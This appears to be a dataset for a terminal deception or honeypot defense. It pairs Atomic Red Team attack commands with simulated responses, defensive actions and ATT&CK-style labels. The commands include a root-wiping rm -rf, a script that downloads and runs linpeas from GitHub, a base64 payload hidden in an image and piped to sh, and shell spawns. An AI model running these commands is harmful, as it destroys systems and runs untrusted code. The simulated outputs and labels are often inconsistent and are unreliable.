@@ -1,0 +1,2174 @@
+action:{ if output is upload or download, Block this command by the network traffic }
+command:whoami
+response:
+chris
+chris@speedlab-ml-3:~$ 
+
+tactic:1
+technique:103
+
+
+action:{ if output is file content, Change the file content }
+command:mkdir $HOME/...
+response:mkdir: creation of directory '/home/chris/...' failed: No such file or directory
+chris@speedlab-ml-3:~$ 
+tactic:1
+technique:120
+
+
+action:{ Restore to original state }
+command:cp $(which sh) $HOME/...
+response:cp: target '/home/chris/...' is not a directory
+chris@speedlab-ml-3:~$
+action:{ if output is file content, Change the file content }
+command:whoami
+response:chris
+tactic:1
+technique:9
+
+
+action:{ if output contain network speed, Degrade the network speed }
+command:pip install requests
+response:Collecting requests
+  Downloading requests-2.28.1-py3-none-any.whl (62 kB)
+     |¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i| 62 kB 1.2 MB/s 
+Installing collected packages: requests
+Successfully installed requests-2.28.1
+chris@speedlab-ml-3:~$
+tactic:4
+technique:29
+
+
+action:{ Change terminal output this time }
+command:which_python=$(which python || which python3 || which python3.9 || which python2)
+response:which_python=/usr/bin/python3
+chris@speedlab-ml-3:~$
+tactic:1
+technique:29
+
+
+action:{ if output is file content, Change the file content }
+command:$which_python -c "import pty;pty.spawn('/bin/sh')"
+response:chris@speedlab-ml-3:~$ 
+tactic:3
+technique:29
+
+
+action:{ Block this command this time }
+command:exit
+response:chris@speedlab-ml-3:~$ 
+tactic:1
+technique:29
+
+
+action:{ if output contain network speed, Degrade the network speed }
+command:$which_python -c "import pty;pty.spawn('/bin/bash')"
+response:chris@speedlab-ml-3:~$ 
+action:{ Block this command this time }
+command:whoami
+response:chris@speedlab-ml-3:~$ 
+tactic:1
+technique:40
+
+
+action:{ Restore to original state }
+command:[ "$(uname)" = 'Linux' ] && rm -rf / --no-preserve-root > /dev/null 2> /dev/null || chflags -R 0 / && rm -rf / > /dev/null 2> /dev/null
+response:chris@speedlab-ml-3:~$ 
+action:{ Change terminal output this time }
+command:whoami
+response:chris
+chris@speedlab-ml-3:~$
+tactic:1
+technique:40
+
+
+action:{ if output is upload or download, Block this command by the network traffic }
+command:echo missing ldapsearch command; exit 1
+response:missing ldapsearch command
+chris@speedlab-ml-3:~$
+tactic:6
+technique:134
+
+
+action:
+command:ldapsearch -H ldap://example.com:389 -x -D user@example.com -w s3CurePssw0rD! -b "CN=Users,DC=example,DC=com" "(objectClass=group)" -s sub -a always -z 1000 dn 
+response:E1620: 89:1:1: Unsupported search result
+chris@speedlab-ml-3:~$
+tactic:2
+technique:105
+
+
+action:{ Restore to original state }
+command:pip install requests    
+response:Collecting requests
+  Downloading requests-2.26.0-py2.py3-none-any.whl (62 kB)
+Collecting idna<4,>=2.5
+  Downloading idna-3.3-py3-none-any.whl (61 kB)
+Collecting charset-normalizer<3,>=2
+  Downloading charset_normalizer-2.1.1-py3-none-any.whl (37 kB)
+Collecting urllib3<1.27,>=1.21.1
+  Downloading urllib3-1.26.7-py2.py3-none-any.whl (154 kB)
+Collecting certifi>=2017.4.17
+  Downloading certifi-2021.10.8-py3-none-any.whl (150 kB)
+Installing collected packages: idna, charset-normalizer, urllib3, certifi, requests
+Successfully installed certifi-2021.10.8 charset-normalizer-2.1.1 idna-3.3 requests-2.26.0 urllib3-1.26.7
+chris@speedlab-ml-3:~$
+tactic:1
+technique:29
+
+
+action:{ if output contain network speed, Degrade the network speed }
+command:which_python=$(which python || which python3 || which python3.9 || which python2)
+response:/usr/bin/python3
+chris@speedlab-ml-3:~$
+tactic:1
+technique:29
+
+
+action:{ if output content access right relative, change the access rights }
+command:echo 'import requests' > T1059.006.py
+response:chris@speedlab-ml-3:~$
+tactic:1
+technique:29
+
+
+action:{ Change terminal output this time }
+command:echo 'import os' >> T1059.006.py
+response:chris@speedlab-ml-3:~$
+tactic:1
+technique:29
+
+
+action:{ Block this command this time }
+command:echo 'url = "https://github.com/carlospolop/PEASS-ng/releases/download/20220214/linpeas.sh"' >> T1059.006.py
+response:chris@speedlab-ml-3:~$
+tactic:1
+technique:29
+
+
+action:{ Change terminal output this time }
+command:echo 'malicious_command = "sh T1059.006-payload -q -o SysI, Devs, AvaSof, ProCronSrvcsTmrsSocks, Net, UsrI, SofI, IntFiles"' >> T1059.006.py
+response:chris@speedlab-ml-3:~$
+tactic:1
+technique:29
+
+
+action:{ if output content access right relative, change the access rights }
+command:echo 'session = requests.session()' >> T1059.006.py
+response:chris@speedlab-ml-3:~$
+tactic:1
+technique:29
+
+
+action:{ if output content access right relative, change the access rights }
+command:echo 'source = session.get(url).content' >> T1059.006.py
+response:chris@speedlab-ml-3:~$
+tactic:1
+technique:29
+
+
+action:{ if output is file content, Change the file content }
+command:echo 'fd = open("T1059.006-payload", "wb+")' >> T1059.006.py
+response:chris@speedlab-ml-3:~$
+tactic:2
+technique:29
+
+
+action:{ if output contain network speed, Degrade the network speed }
+command:echo 'fd.write(source)' >> T1059.006.py
+response:chris@speedlab-ml-3:~$
+tactic:1
+technique:29
+
+
+action:{ if output content access right relative, change the access rights }
+command:echo 'fd.close()' >> T1059.006.py
+response:chris@speedlab-ml-3:~$
+tactic:1
+technique:29
+
+
+action:{ if output contain network speed, Degrade the network speed }
+command:echo 'os.system(malicious_command)' >> T1059.006.py
+response:chris@speedlab-ml-3:~$
+tactic:1
+technique:29
+
+
+action:{ if output contain hardware setting, Change hardware setting }
+command:$which_python T1059.006.py
+response:/usr/bin/python3
+chris@speedlab-ml-3:~$
+tactic:1
+technique:103
+
+
+action:{ Change terminal output this time }
+command:[ "$(uname)" = 'Linux' ] && rm -rf / --no-preserve-root > /dev/null 2> /dev/null || chflags -R 0 / && rm -rf / > /dev/null 2> /dev/null
+response:chris@speedlab-ml-3:~$
+tactic:3
+technique:29
+
+
+action:{ if output is upload or download, Block this command by the network traffic }
+command:[ "$(uname)" = 'FreeBSD' ] && alias python3=python3.9
+response:chris@speedlab-ml-3:~$
+tactic:8
+technique:72
+
+
+action:{ if output is upload or download, Block this command by the network traffic }
+command:if [ $(which python3) ]; then cd /tmp; python3 -m http.server 9090 & PID=$!; sleep 10; kill $PID; unset PID; fi
+response:chris@speedlab-ml-3:~$
+tactic:1
+technique:29
+
+
+action:{ if output is upload or download, Block this command by the network traffic }
+command:cp /bin/ls /tmp/evil-binary
+response:chris@speedlab-ml-3:~$
+action:{ if output is file content, Change the file content }
+command:whoami
+response:chris
+tactic:1
+technique:9
+
+
+action:
+command:pip install requests
+response:Requirement already satisfied: requests in /usr/local/lib/python3.8/dist-packages (2.25.1)
+Requirement already satisfied: certifi>=2017.4.17 in /usr/local/lib/python3.8/dist-packages (from requests) (2020.12.5)
+Requirement already satisfied: chardet<5,>=3.0.2 in /usr/local/lib/python3.8/dist-packages (from requests) (4.0.0)
+Requirement already satisfied: idna<3,>=2.5 in /usr/local/lib/python3.8/dist-packages (from requests) (2.10)
+Requirement already satisfied: urllib3<1.27,>=1.21.1 in /usr/local/lib/python3.8/dist-packages (from requests) (1.26.5)
+chris@speedlab-ml-3:~$
+tactic:1
+technique:29
+
+
+action:{ if output is file content, Change the file content }
+command:which_python=$(which python || which python3 || which python3.9 || which python2)
+response:/usr/bin/python3
+chris@speedlab-ml-3:~$
+tactic:1
+technique:29
+
+
+action:{ Change terminal output this time }
+command:$which_python -c "import pty;pty.spawn('/bin/sh')"
+response:chris@speedlab-ml-3:~$
+tactic:3
+technique:29
+
+
+action:{ if output is upload or download, Block this command by the network traffic }
+command:exit
+response:chris@speedlab-ml-3:~$
+tactic:3
+technique:29
+
+
+action:{ Restore to original state }
+command:$which_python -c "import pty;pty.spawn('/bin/bash')"
+response:chris@speedlab-ml-3:~$
+tactic:4
+technique:123
+
+
+action:{ if output is upload or download, Block this command by the network traffic }
+command:exit
+response:chris@speedlab-ml-3:~$
+tactic:5
+technique:40
+
+
+action:{ Block this command this time }
+command:cat "/home/atomics/script.sh" | base64 | xxd -p | sed 's/../& /g' | xargs -n1 | xxd -r -p | cat "/home/atomics/image.jpg" - > "/home/atomics/evil_image.jpg"; strings "/home/atomics/evil_image.jpg" | tail -n 1 | base64 -d | sh
+response:chris@speedlab-ml-3:~$
+tactic:2
+technique:9
+
+
+action:{ if output contain network speed, Degrade the network speed }
+command:pip install requests    
+response:Requirement already satisfied: requests in /usr/local/lib/python3.8/dist-packages (2.25.1)
+Requirement already satisfied: certifi>=2017.4.17 in /usr/local/lib/python3.8/dist-packages (from requests) (2020.12.5)
+Requirement already satisfied: chardet<5,>=3.0.2 in /usr/local/lib/python3.8/dist-packages (from requests) (4.0.0)
+Requirement already satisfied: idna<3,>=2.5 in /usr/local/lib/python3.8/dist-packages (from requests) (2.10)
+Requirement already satisfied: urllib3<1.27,>=1.21.1 in /usr/local/lib/python3.8/dist-packages (from requests) (1.26.5)
+chris@speedlab-ml-3:~$
+tactic:8
+technique:29
+
+
+action:{ if output is file content, Change the file content }
+command:which_python=$(which python || which python3 || which python3.9 || which python2)
+response:/usr/bin/python3
+chris@speedlab-ml-3:~$
+tactic:1
+technique:29
+
+
+action:{ if output is file content, Change the file content }
+command:echo 'import requests' > T1059.006.py
+response:chris@speedlab-ml-3:~$
+tactic:1
+technique:29
+
+
+action:
+command:echo 'import os' >> T1059.006.py
+response:chris@speedlab-ml-3:~$
+tactic:1
+technique:29
+
+
+action:{ if output contain hardware setting, Change hardware setting }
+command:echo 'url = "https://github.com/carlospolop/PEASS-ng/releases/download/20220214/linpeas.sh"' >> T1059.006.py
+response:chris@speedlab-ml-3:~$
+tactic:1
+technique:29
+
+
+action:
+command:echo 'malicious_command = "sh T1059.006-payload -q -o SysI, Devs, AvaSof, ProCronSrvcsTmrsSocks, Net, UsrI, SofI, IntFiles"' >> T1059.006.py
+response:chris@speedlab-ml-3:~$
+tactic:1
+technique:29
+
+
+action:
+command:echo 'session = requests.session()' >> T1059.006.py
+response:chris@speedlab-ml-3:~$
+tactic:1
+technique:29
+
+
+action:
+command:echo 'source = session.get(url).content' >> T1059.006.py
+response:chris@speedlab-ml-3:~$
+tactic:1
+technique:29
+
+
+action:{ if output content access right relative, change the access rights }
+command:echo 'fd = open("T1059.006-payload", "wb+")' >> T1059.006.py
+response:chris@speedlab-ml-3:~$
+tactic:1
+technique:29
+
+
+action:{ Restore to original state }
+command:echo 'fd.write(source)' >> T1059.006.py
+response:chris@speedlab-ml-3:~$
+tactic:1
+technique:29
+
+
+action:{ if output contain hardware setting, Change hardware setting }
+command:echo 'fd.close()' >> T1059.006.py
+response:chris@speedlab-ml-3:~$
+tactic:1
+technique:29
+
+
+action:{ if output contain hardware setting, Change hardware setting }
+command:echo 'os.system(malicious_command)' >> T1059.006.py
+response:chris@speedlab-ml-3:~$
+tactic:1
+technique:29
+
+
+action:
+command:$which_python T1059.006.py
+response:chris@speedlab-ml-3:~$
+tactic:2
+technique:9
+
+
+action:{ if output contain network speed, Degrade the network speed }
+command:pip install requests
+response:Requirement already satisfied: requests in /usr/local/lib/python3.8/dist-packages (2.25.1)
+Requirement already satisfied: certifi>=2017.4.17 in /usr/local/lib/python3.8/dist-packages (from requests) (2020.12.5)
+Requirement already satisfied: chardet<5,>=3.0.2 in /usr/local/lib/python3.8/dist-packages (from requests) (4.0.0)
+Requirement already satisfied: idna<3,>=2.5 in /usr/local/lib/python3.8/dist-packages (from requests) (2.10)
+Requirement already satisfied: urllib3<1.27,>=1.21.1 in /usr/local/lib/python3.8/dist-packages (from requests) (1.26.5)
+chris@speedlab-ml-3:~$
+tactic:8
+technique:29
+
+
+action:{ if output content access right relative, change the access rights }
+command:which_python=$(which python || which python3 || which python3.9 || which python2)
+response:/usr/bin/python3
+chris@speedlab-ml-3:~$
+tactic:1
+technique:29
+
+
+action:{ if output is file content, Change the file content }
+command:$which_python -c 'import requests;import os;url = "https://github.com/carlospolop/PEASS-ng/releases/download/20220214/linpeas.sh";malicious_command = "sh T1059.006-payload -q -o SysI, Devs, AvaSof, ProCronSrvcsTmrsSocks, Net, UsrI, SofI, IntFiles";session = requests.session();source = session.get(url).content;fd = open("T1059.006-payload", "wb+");fd.write(source);fd.close();os.system(malicious_command)'
+response:chris@speedlab-ml-3:~$
+tactic:1
+technique:103
+
+
+action:
+command:mkdir $HOME/...
+response:mkdir: cannot create directory ¡¥/home/chris/...¡¦: No such file or directory
+chris@speedlab-ml-3:~$
+tactic:1
+technique:120
+
+
+action:{ if output contain hardware setting, Change hardware setting }
+command:cp $(which sh) $HOME/...
+response:cp: target ¡¥/home/chris/...¡¦ is not a directory
+chris@speedlab-ml-3:~$
+tactic:1
+technique:112
+
+
+action:{ if output is file content, Change the file content }
+command:$HOME/.../sh -c "echo Hello from the Atomic Red Team test T1036.005#1"
+response:bash: /home/chris/.../sh: No such file or directory
+chris@speedlab-ml-3:~$
+tactic:11
+technique:72
+
+
+action:{ if output is file content, Change the file content }
+command:cat "/home/atomics/script.sh" | base64 | xxd -p | sed 's/../& /g' | xargs -n1 | xxd -r -p | cat "/home/atomics/image.jpg" - > "/home/atomics/evil_image.jpg"; strings "/home/atomics/evil_image.jpg" | tail -n 1 | base64 -d | sh
+response:chris@speedlab-ml-3:~$
+tactic:6
+technique:103
+
+
+action:{ if output contain hardware setting, Change hardware setting }
+command:touch /tmp/T1070.006-reference.txt
+response:chris@speedlab-ml-3:~$
+tactic:5
+technique:103
+
+
+action:{ if output is file content, Change the file content }
+command:touch -acmr /bin/sh /tmp/T1070.006-reference.txt
+response:chris@speedlab-ml-3:~$
+tactic:0
+technique:103
+
+
+action:
+command:pip install requests    
+response:Requirement already satisfied: requests in /usr/local/lib/python3.8/dist-packages (2.25.1)
+Requirement already satisfied: certifi>=2017.4.17 in /usr/local/lib/python3.8/dist-packages (from requests) (2020.12.5)
+Requirement already satisfied: chardet<5,>=3.0.2 in /usr/local/lib/python3.8/dist-packages (from requests) (4.0.0)
+Requirement already satisfied: idna<3,>=2.5 in /usr/local/lib/python3.8/dist-packages (from requests) (2.10)
+Requirement already satisfied: urllib3<1.27,>=1.21.1 in /usr/local/lib/python3.8/dist-packages (from requests) (1.26.5)
+chris@speedlab-ml-3:~$
+tactic:1
+technique:29
+
+
+action:
+command:which_python=$(which python || which python3 || which python3.9 || which python2)
+response:/usr/bin/python3
+chris@speedlab-ml-3:~$
+tactic:1
+technique:29
+
+
+action:{ Change terminal output this time }
+command:echo 'import requests' > T1059.006.py
+response:chris@speedlab-ml-3:~$
+tactic:1
+technique:29
+
+
+action:{ if output contain hardware setting, Change hardware setting }
+command:echo 'import os' >> T1059.006.py
+response:chris@speedlab-ml-3:~$
+tactic:1
+technique:29
+
+
+action:{ Restore to original state }
+command:echo 'url = "https://github.com/carlospolop/PEASS-ng/releases/download/20220214/linpeas.sh"' >> T1059.006.py
+response:chris@speedlab-ml-3:~$
+tactic:1
+technique:29
+
+
+action:{ if output is file content, Change the file content }
+command:echo 'malicious_command = "sh T1059.006-payload -q -o SysI, Devs, AvaSof, ProCronSrvcsTmrsSocks, Net, UsrI, SofI, IntFiles"' >> T1059.006.py
+response:chris@speedlab-ml-3:~$
+tactic:1
+technique:29
+
+
+action:{ if output content access right relative, change the access rights }
+command:echo 'session = requests.session()' >> T1059.006.py
+response:chris@speedlab-ml-3:~$
+tactic:1
+technique:29
+
+
+action:{ Change terminal output this time }
+command:echo 'source = session.get(url).content' >> T1059.006.py
+response:chris@speedlab-ml-3:~$
+tactic:8
+technique:29
+
+
+action:{ if output is file content, Change the file content }
+command:echo 'fd = open("T1059.006-payload", "wb+")' >> T1059.006.py
+response:chris@speedlab-ml-3:~$
+tactic:6
+technique:29
+
+
+action:
+command:echo 'fd.write(source)' >> T1059.006.py
+response:chris@speedlab-ml-3:~$
+tactic:0
+technique:29
+
+
+action:
+command:echo 'fd.close()' >> T1059.006.py
+response:chris@speedlab-ml-3:~$
+tactic:1
+technique:29
+
+
+action:{ if output contain network speed, Degrade the network speed }
+command:echo 'os.system(malicious_command)' >> T1059.006.py
+response:chris@speedlab-ml-3:~$
+tactic:2
+technique:29
+
+
+action:{ if output content access right relative, change the access rights }
+command:$which_python T1059.006.py
+response:chris@speedlab-ml-3:~$
+tactic:2
+technique:9
+
+
+action:{ Block this command this time }
+command:pip install requests
+response:chris@speedlab-ml-3:~$
+tactic:1
+technique:29
+
+
+action:{ if output is upload or download, Block this command by the network traffic }
+command:which_python=$(which python || which python3 || which python3.9 || which python2)
+response:chris@speedlab-ml-3:~$
+tactic:1
+technique:29
+
+
+action:{ Restore to original state }
+command:$which_python -c 'import requests;import os;url = "https://github.com/carlospolop/PEASS-ng/releases/download/20220214/linpeas.sh";malicious_command = "sh T1059.006-payload -q -o SysI, Devs, AvaSof, ProCronSrvcsTmrsSocks, Net, UsrI, SofI, IntFiles";session = requests.session();source = session.get(url).content;fd = open("T1059.006-payload", "wb+");fd.write(source);fd.close();os.system(malicious_command)'
+response:chris@speedlab-ml-3:~$
+tactic:1
+technique:29
+
+
+action:{ Block this command this time }
+command:echo missing ldapsearch command; exit 1
+response:chris@speedlab-ml-3:~$
+tactic:6
+technique:134
+
+
+action:{ if output is file content, Change the file content }
+command:ldapsearch -H ldap://example.com:389 -x -D user@example.com -w s3CurePssw0rD! -b "CN=Users,DC=example,DC=com" "(objectClass=group)" -s sub -a always -z 1000 dn 
+response:chris@speedlab-ml-3:~$
+tactic:11
+technique:103
+
+
+action:{ if output contain network speed, Degrade the network speed }
+command:pip install requests
+response:Requirement already satisfied: requests in /usr/local/lib/python3.8/dist-packages (2.25.1)
+Requirement already satisfied: certifi>=2017.4.17 in /usr/local/lib/python3.8/dist-packages (from requests) (2020.12.5)
+Requirement already satisfied: chardet<5,>=3.0.2 in /usr/local/lib/python3.8/dist-packages (from requests) (4.0.0)
+Requirement already satisfied: idna<3,>=2.5 in /usr/local/lib/python3.8/dist-packages (from requests) (2.10)
+Requirement already satisfied: urllib3<1.27,>=1.21.1 in /usr/local/lib/python3.8/dist-packages (from requests) (1.26.5)
+chris@speedlab-ml-3:~$
+tactic:8
+technique:29
+
+
+action:{ if output content access right relative, change the access rights }
+command:which_python=$(which python || which python3 || which python3.9 || which python2)
+response:/usr/bin/python3
+chris@speedlab-ml-3:~$
+tactic:1
+technique:29
+
+
+action:{ if output is upload or download, Block this command by the network traffic }
+command:$which_python -c 'import requests;import os;url = "https://github.com/carlospolop/PEASS-ng/releases/download/20220214/linpeas.sh";malicious_command = "sh T1059.006-payload -q -o SysI, Devs, AvaSof, ProCronSrvcsTmrsSocks, Net, UsrI, SofI, IntFiles";session = requests.session();source = session.get(url).content;fd = open("T1059.006-payload", "wb+");fd.write(source);fd.close();os.system(malicious_command)'
+response:chris@speedlab-ml-3:~$
+tactic:1
+technique:165
+
+
+action:{ if output contain hardware setting, Change hardware setting }
+command:whoami
+response:chris
+tactic:0
+technique:40
+
+
+action:{ if output is file content, Change the file content }
+command:pip install requests    
+response:Defaulting to user installation because normal site-packages is not writeable  
+Collecting requests  
+  Downloading requests-2.26.0-py2.py3-none-any.whl (62 kB)  
+     |¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i| 62 kB 569 kB/s   
+Collecting urllib3<1.27,>=1.21.1  
+  Downloading urllib3-1.26.6-py2.py3-none-any.whl (138 kB)  
+     |¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i| 138 kB 1.2 MB/s  
+Collecting charset-normalizer<3,>=2  
+  Downloading charset_normalizer-2.0.7-py3-none-any.whl (37 kB)  
+Collecting idna<4,>=2.5  
+  Downloading idna-3.2-py3-none-any.whl (58 kB)  
+     |¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i| 58 kB 5.6 MB/s  
+Collecting certifi>=2017.4.17  
+  Downloading certifi-2021.10.8-py3-none-any.whl (149 kB)  
+     |¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i| 149 kB 2.0 MB/s  
+Installing collected packages: urllib3, charset-normalizer, idna, certifi, requests  
+Successfully installed certifi-2021.10.8 charset-normalizer-2.0.7 idna-3.2 requests-2.26.0 urllib3-1.26.6  
+chris@speedlab-ml-3:~$
+tactic:1
+technique:29
+
+
+action:{ Change terminal output this time }
+command:which_python=$(which python || which python3 || which python3.9 || which python2)
+response:/usr/bin/python3  
+chris@speedlab-ml-3:~$
+tactic:1
+technique:29
+
+
+action:{ if output is file content, Change the file content }
+command:echo 'import requests' > T1059.006.py
+response:chris@speedlab-ml-3:~$
+tactic:1
+technique:29
+
+
+action:{ Restore to original state }
+command:echo 'import os' >> T1059.006.py
+response:chris@speedlab-ml-3:~$
+tactic:1
+technique:29
+
+
+action:{ if output contain network speed, Degrade the network speed }
+command:echo 'url = "https://github.com/carlospolop/PEASS-ng/releases/download/20220214/linpeas.sh"' >> T1059.006.py
+response:chris@speedlab-ml-3:~$
+tactic:2
+technique:29
+
+
+action:{ if output is upload or download, Block this command by the network traffic }
+command:echo 'malicious_command = "sh T1059.006-payload -q -o SysI, Devs, AvaSof, ProCronSrvcsTmrsSocks, Net, UsrI, SofI, IntFiles"' >> T1059.006.py
+response:chris@speedlab-ml-3:~$
+tactic:4
+technique:29
+
+
+action:{ Change terminal output this time }
+command:echo 'session = requests.session()' >> T1059.006.py
+response:chris@speedlab-ml-3:~$
+tactic:8
+technique:29
+
+
+action:{ if output is upload or download, Block this command by the network traffic }
+command:echo 'source = session.get(url).content' >> T1059.006.py
+response:chris@speedlab-ml-3:~$
+tactic:1
+technique:29
+
+
+action:{ if output contain network speed, Degrade the network speed }
+command:echo 'fd = open("T1059.006-payload", "wb+")' >> T1059.006.py
+response:chris@speedlab-ml-3:~$
+tactic:4
+technique:29
+
+
+action:{ Block this command this time }
+command:echo 'fd.write(source)' >> T1059.006.py
+response:chris@speedlab-ml-3:~$
+tactic:4
+technique:29
+
+
+action:{ Block this command this time }
+command:echo 'fd.close()' >> T1059.006.py
+response:chris@speedlab-ml-3:~$
+tactic:1
+technique:29
+
+
+action:
+command:echo 'os.system(malicious_command)' >> T1059.006.py
+response:chris@speedlab-ml-3:~$
+action:{ Restore to original state }
+command:whoami
+response:chris
+tactic:4
+technique:29
+
+
+action:{ Change terminal output this time }
+command:[ "$(uname)" = 'FreeBSD' ] && alias python3=python3.9
+response:chris@speedlab-ml-3:~$ [ "$(uname)" = 'FreeBSD' ] && alias python3=python3.9
+chris@speedlab-ml-3:~$
+tactic:8
+technique:1
+
+
+action:{ if output contain hardware setting, Change hardware setting }
+command:if [ $(which python3) ]; then cd /tmp; python3 -m http.server 9090 & PID=$!; sleep 10; kill $PID; unset PID; fi
+response:chris@speedlab-ml-3:~$ if [ $(which python3) ]; then cd /tmp; python3 -m http.server 9090 & PID=$!; sleep 10; kill $PID; unset PID; fi
+chris@speedlab-ml-3:~$
+tactic:4
+technique:128
+
+
+action:{ Restore to original state }
+command:cp /bin/ls /tmp/evil-binary
+response:chris@speedlab-ml-3:~$ cp /bin/ls /tmp/evil-binary
+chris@speedlab-ml-3:~$
+tactic:1
+technique:40
+
+
+action:{ Restore to original state }
+command:dd if=/dev/zero bs=1 count=1 >> /tmp/evil-binary #adds null bytes
+response:chris@speedlab-ml-3:~$ dd if=/dev/zero bs=1 count=1 >> /tmp/evil-binary #adds null bytes
+1+0 records in
+1+0 records out
+1 byte copied, 0.000123456 s, 8.1 kB/s
+chris@speedlab-ml-3:~$
+tactic:1
+technique:40
+
+
+action:{ Block this command this time }
+command:dd if=/dev/random bs=1 count=1 >> /tmp/evil-binary #adds high-quality random data
+response:chris@speedlab-ml-3:~$ dd if=/dev/random bs=1 count=1 >> /tmp/evil-binary #adds high-quality random data
+dd: error: /tmp/evil-binary: Permission denied
+chris@speedlab-ml-3:~$
+tactic:1
+technique:128
+
+
+action:{ if output contain hardware setting, Change hardware setting }
+command:dd if=/dev/urandom bs=1 count=1 >> /tmp/evil-binary #adds low-quality random data
+response:chris@speedlab-ml-3:~$ dd if=/dev/urandom bs=1 count=1 >> /tmp/evil-binary #adds low-quality random data
+dd: error: /tmp/evil-binary: Permission denied
+chris@speedlab-ml-3:~$
+tactic:1
+technique:9
+
+
+action:{ if output contain network speed, Degrade the network speed }
+command:pip install requests
+response:chris@speedlab-ml-3:~$ pip install requests
+Defaulting to user installation because normal site-packages is not writeable
+Collecting requests
+  Downloading requests-2.26.0-py2.py3-none-any.whl (62 kB)
+     |¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i| 62 kB 2.3 MB/s 
+Collecting urllib3<1.27,>=1.21.1
+  Downloading urllib3-1.26.7-py2.py3-none-any.whl (138 kB)
+     |¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i| 138 kB 1.1 MB/s 
+Collecting charset-normalizer~=2.0.0,<3.0.0
+  Downloading charset_normalizer-2.0.12-py3-none-any.whl (37 kB)
+Collecting idna<4,>=2.5
+  Downloading idna-3.3-py3-none-any.whl (61 kB)
+     |¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i| 61 kB 1.2 MB/s 
+Collecting certifi>=2017.4.17
+  Downloading certifi-2021.10.8-py3-none-any.whl (149 kB)
+     |¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i| 149 kB 549.0 kB/s 
+Installing collected packages: urllib3, charset-normalizer, idna, certifi, requests
+Successfully installed certifi-2021.10.8 charset-normalizer-2.0.12 idna-3.3 requests-2.26.0 urllib3-1.26.7
+chris@speedlab-ml-3:~$
+tactic:0
+technique:29
+
+
+action:{ if output contain network speed, Degrade the network speed }
+command:which_python=$(which python || which python3 || which python3.9 || which python2)
+response:chris@speedlab-ml-3:~$ which_python=$(which python || which python3 || which python3.9 || which python2)
+chris@speedlab-ml-3:~$
+tactic:1
+technique:29
+
+
+action:{ if output contain hardware setting, Change hardware setting }
+command:$which_python -c "import pty;pty.spawn('/bin/sh')"
+response:chris@speedlab-ml-3:~$ $which_python -c "import pty;pty.spawn('/bin/sh')"
+chris@speedlab-ml-3:~$
+tactic:4
+technique:177
+
+
+action:{ Restore to original state }
+command:exit
+response:chris@speedlab-ml-3:~$ exit
+logout
+chris@speedlab-ml-3:~$
+tactic:4
+technique:29
+
+
+action:{ Restore to original state }
+command:$which_python -c "import pty;pty.spawn('/bin/bash')"
+response:chris@speedlab-ml-3:~$ $which_python -c "import pty;pty.spawn('/bin/bash')"
+chris@speedlab-ml-3:~$
+tactic:4
+technique:163
+
+
+action:{ Block this command this time }
+command:exit
+response:chris@speedlab-ml-3:~$ exit
+bash: exit: cannot exit from this shell
+chris@speedlab-ml-3:~$
+tactic:1
+technique:29
+
+
+action:{ if output content access right relative, change the access rights }
+command:export ART='echo "Atomic Red Team was here... T1059.004"'
+response:chris@speedlab-ml-3:~$ export ART='echo "Atomic Red Team was here... T1059.004"'
+chris@speedlab-ml-3:~$
+tactic:3
+technique:29
+
+
+action:
+command:echo $ART |/bin/sh
+response:Atomic Red Team was here... T1059.004
+chris@speedlab-ml-3:~$
+tactic:8
+technique:29
+
+
+action:{ Change terminal output this time }
+command:pip install requests
+response:chris@speedlab-ml-3:~$ pip install requests
+ERROR: Could not find a version that satisfies the requirement requests (from versions: none)
+ERROR: No matching distribution found for requests
+chris@speedlab-ml-3:~$
+tactic:8
+technique:29
+
+
+action:{ if output is file content, Change the file content }
+command:which_python=$(which python || which python3 || which python3.9 || which python2)
+response:chris@speedlab-ml-3:~$ which_python=$(which python || which python3 || which python3.9 || which python2)
+chris@speedlab-ml-3:~$
+action:
+command:whoami
+response:chris
+tactic:6
+technique:134
+
+
+action:{ Block this command this time }
+command:if [ -x "$(command -v dscacheutil)" ]; then dscacheutil -q group; else echo "dscacheutil is missing from the machine. skipping..."; fi;
+response:chris@speedlab-ml-3:~$ 
+tactic:6
+technique:134
+
+
+action:{ if output is upload or download, Block this command by the network traffic }
+command:if [ -x "$(command -v dscl)" ]; then dscl . -list /Groups; else echo "dscl is missing from the machine. skipping..."; fi;
+response:chris@speedlab-ml-3:~$ 
+tactic:6
+technique:134
+
+
+action:{ Change terminal output this time }
+command:if [ -x "$(command -v groups)" ]; then groups; else echo "groups is missing from the machine. skipping..."; fi;
+response:```plaintext
+chris : chris adm cdrom sudo dip plugdev lpadmin sambashare
+```
+chris@speedlab-ml-3:~$
+tactic:6
+technique:134
+
+
+action:{ if output contain hardware setting, Change hardware setting }
+command:if [ -x "$(command -v id)" ]; then id; else echo "id is missing from the machine. skipping..."; fi;
+response:chris@speedlab-ml-3:~$
+tactic:8
+technique:134
+
+
+action:{ Block this command this time }
+command:if [ -x "$(command -v getent)" ]; then getent group; else echo "getent is missing from the machine. skipping..."; fi;
+response:chris@speedlab-ml-3:~$
+tactic:8
+technique:134
+
+
+action:{ Block this command this time }
+command:cat /etc/group
